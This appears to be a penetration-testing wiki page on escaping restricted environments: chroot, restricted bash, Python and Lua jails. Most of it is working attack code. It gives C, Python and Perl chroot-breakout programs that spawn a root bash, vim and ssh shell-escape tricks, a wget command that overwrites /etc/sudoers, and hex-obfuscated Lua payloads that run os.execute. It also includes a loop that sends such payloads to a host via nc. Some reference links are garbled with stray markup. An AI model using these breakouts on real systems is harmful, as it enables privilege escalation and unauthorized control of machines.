# Escaping from Jails

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io/) **if you can execute any binary with "Shell" property**

## Chroot limitation

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations):  The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** \(**root**\) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.

Therefore, if you are **root** inside a chroot you **can escape** creating **another chroot**. However, in several cases inside the first chroot you won't be able to execute the chroot command, therefore you will need to compile a binary like the following one and run it:

{% code title="break\_chroot.c" %}
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```
{% endcode %}

Using **python**:

```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```

Using **perl**:

```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```

## Bash Jails

### Modify PATH

Check if you can modify the PATH env variable

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

### Using vim

```bash
:set shell=/bin/sh
:shell
```

### Create script

Check if you can create an executable file with _/bin/bash_ as content

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

### Get bash from SSH

If you are accessing via ssh you can use this trick to execute a bash shell:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
```

### Wget

You can overwrite for example sudoers file

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

### Other tricks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)  
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**]%28https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)  
[https://gtfobins.github.io](https://gtfobins.github.io**]%28https://gtfobins.github.io)  
**It could also be interesting the page:**

{% page-ref page="../useful-linux-commands/bypass-bash-restrictions.md" %}

## Python Jails

Tricks about escaping from python jails in the following page:

{% page-ref page="../../misc/basic-python/bypass-python-sandboxes.md" %}

## Lua Jails

In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval** with command execution**:**

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

Some tricks to **call functions of a library without using dots**:

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

Enumerate functions of a library:

```bash
for k,v in pairs(string) do print(k,v) end
```

Note that every time you execute the previous one liner in a **different lua environment the order of the functions change**. Therefore if you need to execute one specific function you can perform a brute force attack loading different lua environments and calling the first function of le library:

```bash
#In this scenario you could BF the victim that is generating a new lua environment 
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell \(and hopefully unlimited\) calling:

```bash
debug.debug()
```



